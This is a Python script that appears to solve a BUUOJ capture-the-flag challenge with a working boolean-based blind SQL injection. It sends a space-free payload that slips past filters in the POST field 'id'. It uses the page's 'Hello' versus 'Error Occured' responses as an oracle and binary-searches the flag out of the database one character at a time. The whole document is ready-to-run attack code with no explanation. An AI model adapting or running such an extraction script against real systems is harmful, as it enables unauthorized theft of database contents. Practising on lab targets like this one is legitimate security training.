import requests
from loguru import logger as log
from time import sleep
import re

BASE_URL = "http://0e224e5e-cc31-4929-9ac0-24e180036dda.node5.buuoj.cn:81/"
BASE_PAYLOAD = "(select(ascii(mid((select(flag)from(flag)),{pos},1)){op}{val}))"


def check(pos: int, op: str, val: int) -> bool:
	data = {
		"id": BASE_PAYLOAD.format(pos=pos, op=op, val=val)
	}
	res = requests.post(BASE_URL, data=data)
	if res.status_code != 200:
		log.warning(f"Request failed in {pos}")
		raise ValueError("Request failed")
	sleep(0.3)
	# if re.search(r"Error Occured", res.text):
	if "Error Occured" in res.text:
		return False
	if "Hello" in res.text:
		return True
	raise ValueError("Unexpected response")


def binary_search(pos: int, start: int, end: int) -> int:
	left, right = start, end
	op = '>'
	while left < right:
		mid = (left + right) // 2
		if check(pos, op, mid):
			left = mid + 1
		else:
			right = mid
	# last check 
	if check(pos, '=', left):
		return left
	else:
		raise ValueError("Cannot find the value")

def search_pos(pos: int) -> str:
	if check(pos, '=', ord('{')):
		return '{'
	if check(pos, '=', ord('}')):
		return '}'
	if check(pos, '=', ord('-')):
		return '-'
	if check(pos, '>', ord('9')):
		return chr(binary_search(pos, ord('a'), ord('z')))
	else:
		return chr(binary_search(pos, ord('0'), ord('9')))
	

if __name__ == "__main__":
	pos = 1
	# pos = 33
	flag = ""
	# flag = "flag{1710aa78-826c-48cd-9250-8f4"
	while True:
		try:
			char = search_pos(pos)
			log.info("pos: {}, char: {}".format(pos, char))
			flag += char
			if char == '}':
				break
			pos += 1
		except:
			log.error("Error in pos: {}".format(pos))
			log.info(f"Current flag: {flag}")
			break
	log.success(f"Flag: {flag}")